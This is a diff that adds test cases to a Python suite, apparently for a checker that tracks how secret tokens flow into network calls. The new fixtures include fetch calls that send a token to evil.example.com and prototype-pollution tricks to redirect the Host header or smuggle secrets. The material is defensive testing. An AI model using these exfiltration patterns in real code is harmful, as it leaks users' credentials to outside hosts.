@@ -802,6 +802,13 @@ class TestSecretHosts(SimpleTestCase):
                 {"token": UNBOUND},
             ),
             (
+                "host_header_behind_a_prototype_key_in_a_dictionary_input",
+                "fetch('https://hooks.example.com', {'headers': inputs.headers, 'body': inputs.token})",
+                _inputs(token="t", headers={"__proto__": {"Host": "evil.example.com"}}),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
                 "secret_logged_through_a_lambda",
                 "let same := (v) -> v\nprint(same(inputs.salt))",
                 _inputs(salt="s"),
@@ -840,6 +847,36 @@ class TestSecretHosts(SimpleTestCase):
                 nullcontext,
             ),
             ("unsupported_code", "fetch('https://evil.example.com', {'body': inputs.token})()", {}, nullcontext),
+            (
+                "unsupported_code",
+                "fetch('https://evil.example.com', {'__proto__': {'secret_headers_input': concat('to', 'ken')}})",
+                {},
+                nullcontext,
+            ),
+            (
+                "unsupported_code",
+                "let options := {}\noptions.constructor := {'secret_headers_input': 'token'}\nfetch('https://evil.example.com', options)",
+                {},
+                nullcontext,
+            ),
+            (
+                "unsupported_code",
+                "let headers := {}\nheaders['prototype'] := {'Host': 'evil.example.com'}\nfetch(inputs.url, {'headers': headers, 'body': inputs.token})",
+                {},
+                nullcontext,
+            ),
+            (
+                "unsupported_code",
+                "fetch(inputs.url, {'body': inputs.note})",
+                {"note": "{print(inputs.token)('x')}"},
+                nullcontext,
+            ),
+            (
+                "unsupported_code",
+                "fetch(inputs.url, {'body': inputs.note})",
+                {"note": "{ {'__proto__': inputs.token} }"},
+                nullcontext,
+            ),
             ("unparseable", "fetch(inputs.url, {", {}, nullcontext),
             (
                 "too_deep",
